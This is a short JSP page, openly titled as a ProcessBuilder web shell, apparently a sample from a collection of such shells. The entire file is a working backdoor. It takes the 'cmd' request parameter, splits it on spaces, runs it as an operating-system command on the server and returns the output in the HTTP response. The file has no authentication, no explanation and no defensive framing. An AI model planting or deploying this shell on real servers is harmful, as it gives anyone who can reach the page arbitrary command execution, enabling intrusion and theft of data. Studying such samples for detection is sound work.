<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<html>
<body>
<h2>java.lang.ProcessBuilder JSP WebShell</h2>
<%
    try {
        final String s = request.getParameter("cmd");
        Process process = new ProcessBuilder().command(s.split(" ")).start();
        InputStream inputStream = process.getInputStream();
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }
        response.getOutputStream().write(stringBuilder.toString().getBytes());
    } catch (Exception e) {
        e.printStackTrace();
    }

%>
</body>
</html>